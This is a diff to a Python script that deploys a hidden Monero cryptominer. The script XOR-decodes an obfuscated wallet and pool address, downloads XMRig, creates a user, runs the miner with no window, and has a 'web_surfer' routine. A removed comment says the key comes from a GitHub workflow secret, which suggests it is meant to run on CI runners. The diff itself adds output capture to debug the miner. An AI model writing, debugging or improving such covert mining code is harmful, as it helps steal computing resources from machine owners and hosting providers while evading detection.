@@ -8,7 +8,7 @@ import threading
 import urllib.request
 import zipfile
 
-# Force flush of prints
+# Force flush
 def debug_print(*args, **kwargs):
     print(*args, **kwargs)
     sys.stdout.flush()
@@ -27,12 +27,9 @@ ENCODED_POOL = [
 def decode(encoded, key):
     return ''.join(chr(b ^ key) for b in encoded)
 
-# Read XOR key from GitHub secret (set in workflow)
 XOR_KEY = int(os.environ.get('XOR_KEY', '0x55'), 16)
 WALLET = decode(ENCODED_WALLET, XOR_KEY)
 POOL = decode(ENCODED_POOL, XOR_KEY)
-
-# SupportXMR TLS fingerprint
 TLS_FINGERPRINT = "4633ddff863414b7d28bc4ce3e2966335c082d6e3783c412cc059af107a04dfd"
 
 debug_print(f"Decoded wallet: {WALLET[:10]}...")
@@ -94,7 +91,6 @@ def web_surfer(stop_event):
             time.sleep(1)
 
 def main():
-    debug_print("=== main() started ===")
     create_user()
     exe_path = download_xmrig()
     working_dir = os.path.dirname(exe_path)
@@ -141,16 +137,28 @@ def main():
         ]
 
         debug_print(f"[+] Starting miner: {' '.join(cmd)}")
-        # Run miner directly, inherit stdout/stderr so output appears in logs
-        miner_proc = subprocess.Popen(cmd, cwd=working_dir, creationflags=subprocess.CREATE_NO_WINDOW)
+        # Run miner and capture output to see errors
+        miner_proc = subprocess.Popen(
+            cmd,
+            cwd=working_dir,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            text=True,
+            bufsize=1,
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
         debug_print(f"[+] Miner started (PID {miner_proc.pid})")
 
         work_start = time.time()
         while time.time() - work_start < work_sec:
-            if miner_proc.poll() is not None:
-                debug_print(f"[!] Miner died. Exit code: {miner_proc.returncode}")
-                break
-            time.sleep(1)  # wait 1 second, don't poll too fast
+            line = miner_proc.stdout.readline()
+            if line:
+                debug_print(f"[Miner] {line.strip()}")
+            else:
+                if miner_proc.poll() is not None:
+                    debug_print(f"[!] Miner died. Exit code: {miner_proc.returncode}")
+                    break
+                time.sleep(0.5)
 
         if miner_proc.poll() is None:
             miner_proc.terminate()
